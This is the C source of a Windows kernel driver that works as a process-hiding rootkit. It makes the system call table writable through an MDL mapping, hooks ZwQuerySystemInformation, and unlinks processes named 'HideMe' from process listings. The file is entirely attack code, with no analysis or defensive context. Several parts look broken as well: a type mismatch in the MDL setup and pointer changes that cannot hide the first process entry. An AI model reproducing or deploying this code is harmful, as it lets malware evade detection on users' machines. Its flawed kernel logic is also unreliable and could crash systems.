#ifdef __cplusplus   
extern "C"  
{  
#endif   

#include <ntddk.h>

#define SystemProcessInformation 5

NTSTATUS newZwQuerySystemInformation(ULONG SystemInformationClass,
									 PVOID SystemInformation,
									 ULONG SystemInformationLength,
									 PULONG ReturnLength);


typedef struct _WP_GLOBALS
{
	UCHAR * callTable;
	PMDL pMdl;
}WP_GLOBALS;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG NextEntryOffset;  
    ULONG NumberOfThreads;  
    ULONG Reserved[6];  
    LARGE_INTEGER CreateTime;  
    LARGE_INTEGER UserTime;  
    LARGE_INTEGER KernelTime;  
    UNICODE_STRING ProcessName;  
    KPRIORITY BasePriority;  
    HANDLE UniqueProcessId;  
    HANDLE InheritedFromUniqueProcessId;  
    ULONG HandleCount;  
    ULONG SessionId;  
    ULONG_PTR PageDirectoryBase;  
    SIZE_T PeakVirtualSize;  
    SIZE_T VirtualSize;  
    ULONG PageFaultCount;  
    SIZE_T PeakWorkingSetSize;  
    SIZE_T WorkingSetSize;  
    SIZE_T QuotaPeakPagedPoolUsage;  
    SIZE_T QuotaPagedPoolUsage;  
    SIZE_T QuotaPeakNonPagedPoolUsage;  
    SIZE_T QuotaNonPagedPoolUsage;  
    SIZE_T PagefileUsage;  
    SIZE_T PeakPagefileUsage;  
    SIZE_T PrivatePageCount;  
    LARGE_INTEGER ReadOperationCount;  
    LARGE_INTEGER WriteOperationCount;  
    LARGE_INTEGER OtherOperationCount;  
    LARGE_INTEGER ReadTransferCount;  
    LARGE_INTEGER WriteTransferCount;  
    LARGE_INTEGER OtherTransferCount;  
}SYSTEM_PROCESS_INFO,* PSYSTEM_PROCESS_INFO;

#pragma pack(1)
typedef struct ServiceDescriptorEntry
{
	ULONG * KiServiceTable;
	ULONG * CounterBaseTable;
	ULONG nSystemCalls;
	ULONG * KiArgumentTable;
}SDE,* PSDE;
#pragma pack()





typedef NTSTATUS (*ZwQuerySystemInformationPtr)(ULONG,PVOID,ULONG,PULONG);



WP_GLOBALS DisableWP_MDL(ULONG * ssdt,ULONG nServices);
void enableWP_MDL(PMDL mdlPtr,UCHAR * callTable);
ULONG GetSSDTIndex(UCHAR * address);
UCHAR * HookSSDT(UCHAR * apicall,UCHAR * newAddr,ULONG * callTable);
void unHookSSDT(UCHAR * apicall,UCHAR * oldAddr,ULONG * callTable);
NTSTATUS DefaultHandler( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
VOID DriverUnload( IN PDRIVER_OBJECT DriverObject );
NTKERNELAPI NTSTATUS ZwQuerySystemInformation( IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength );  

_declspec(dllimport) SDE KeServiceDescriptorTable;
PMDL pMDL;
PVOID systemCallTable;
WP_GLOBALS wpGlobals;
ZwQuerySystemInformationPtr oldZwQuerySystemInformation;

WP_GLOBALS DisableWP_MDL(ULONG * ssdt,ULONG nServices)
{
	WP_GLOBALS wpGlobals;

	wpGlobals = MmCreateMdl(NULL,
							(PVOID)ssdt,
							(SIZE_T)nServices * 4);

	if(wpGlobals.pMdl == NULL)
	{
		DbgPrint("call MmCreateMdl() error!\n");
		return wpGlobals;
	}

	MmBuildMdlForNonPagedPool(wpGlobals.pMdl);
	(wpGlobals.pMdl)->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	wpGlobals.callTable = (UCHAR *)MmMapLockedPages(wpGlobals.pMdl,KernelMode);

	if(wpGlobals.callTable == NULL)
	{
		DbgPrint("call MmMapLockedPages() error!\n");
		return wpGlobals;
	}

	DbgPrint("use mdl successful!\n");
	return wpGlobals;
}


void enableWP_MDL(PMDL mdlPtr,UCHAR * callTable)
{
	if(mdlPtr != NULL)
	{
		MmUnmapLockedPages((PVOID)callTable,mdlPtr);
		IoFreeMdl(mdlPtr);
	}

}

ULONG GetSSDTIndex(UCHAR * address)
{
	UCHAR * addressOfIndex;
	ULONG indexValue;

	addressOfIndex = address +1;
	indexValue = *((PULONG)addressOfIndex);

	return indexValue;
}

UCHAR * HookSSDT(UCHAR * apicall,UCHAR * newAddr,ULONG * callTable)
{
	PLONG target;
	ULONG indexValue;

	indexValue = GetSSDTIndex(apicall);
	target = (PLONG)(&(callTable[indexValue]));

	return (UCHAR *)InterlockedExchange(target,(LONG)newAddr);
}


void unHookSSDT(UCHAR * apicall,UCHAR * oldAddr,ULONG * callTable)
{
	PLONG target;
	ULONG indexValue;

	indexValue = GetSSDTIndex(apicall);
	target = (PLONG)(&(callTable[indexValue]));

	InterlockedExchange(target,(LONG)oldAddr);

}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath )  
{  
    KdPrint( ( "Enter DriverEntry/n" ) );  
      
    for ( int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )  
    {  
        DriverObject->MajorFunction[i] = DefaultHandler;  
    }  
      
    DriverObject->DriverUnload  = DriverUnload;  

	wpGlobals = DisableWP_MDL(KeServiceDescriptorTable.KiServiceTable,
								KeServiceDescriptorTable.nSystemCalls);
	if((wpGlobals.pMdl == NULL) || (wpGlobals.callTable == NULL))
	{
		return STATUS_UNSUCCESSFUL;
	}
	pMDL = wpGlobals.pMdl;
	systemCallTable = wpGlobals.callTable;

	oldZwQuerySystemInformation = (ZwQuerySystemInformationPtr)HookSSDT((UCHAR *)ZwQuerySystemInformation,
																		(UCHAR *)newZwQuerySystemInformation,
																		(ULONG *)systemCallTable);

      
    
    return STATUS_SUCCESS;  
      
}  

NTSTATUS DefaultHandler( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )  
{  
    KdPrint( ( "Enter DefaultHandler/n" ) );  
      
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;  
    Irp->IoStatus.Information = 0;  
    IoCompleteRequest( Irp, IO_NO_INCREMENT );  
    return Irp->IoStatus.Status;  
}  

VOID DriverUnload( IN PDRIVER_OBJECT DriverObject )
{

	KdPrint( ( "Enter unload/n" ) );  
	unHookSSDT((UCHAR *)ZwQuerySystemInformation,
				(UCHAR *)oldZwQuerySystemInformation,
				(ULONG *)systemCallTable);
	enableWP_MDL(pMDL,(UCHAR *)systemCallTable);
      
    
}



NTSTATUS newZwQuerySystemInformation(ULONG SystemInformationClass,
									 PVOID SystemInformation,
									 ULONG SystemInformationLength,
									 PULONG ReturnLength)
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESS_INFO CurrentSPI,PreviousSPI;

	ntStatus = oldZwQuerySystemInformation(SystemInformationClass,
											SystemInformation,
											SystemInformationLength,
											ReturnLength);

	if(!NT_SUCCESS(ntStatus))
	{
		return ntStatus;
	}

	if(SystemInformationClass == SystemProcessInformation)
	{
		CurrentSPI = (PSYSTEM_PROCESS_INFO)SystemInformation;
		PreviousSPI = NULL;

		while(CurrentSPI != NULL)
		{
			if(CurrentSPI->ProcessName.Buffer != NULL)
			{
				if(memcmp(CurrentSPI->ProcessName.Buffer,L"HideMe",12) == 0)
				{
					if(PreviousSPI != NULL)
					{
						if(CurrentSPI->NextEntryOffset == 0)
						{
							PreviousSPI->NextEntryOffset = 0;
						}
						else
						{
							PreviousSPI->NextEntryOffset += CurrentSPI->NextEntryOffset;
						}
					}
					else
					{
						if(CurrentSPI->NextEntryOffset == 0)
						{
							SystemInformation = NULL;
						}
						else
						{
							(UCHAR * )SystemInformation = (UCHAR *)SystemInformation + CurrentSPI->NextEntryOffset;
						}
					}
				}
			}
			PreviousSPI = CurrentSPI;

			if(CurrentSPI->NextEntryOffset != 0)
			{
				CurrentSPI = ( PSYSTEM_PROCESS_INFO )( ( PCHAR )CurrentSPI + CurrentSPI->NextEntryOffset );
			}
			else
			{
				CurrentSPI = NULL;
			}
		}
	}
	return ntStatus;
}
		

#ifdef __cplusplus   
}  
#endif 



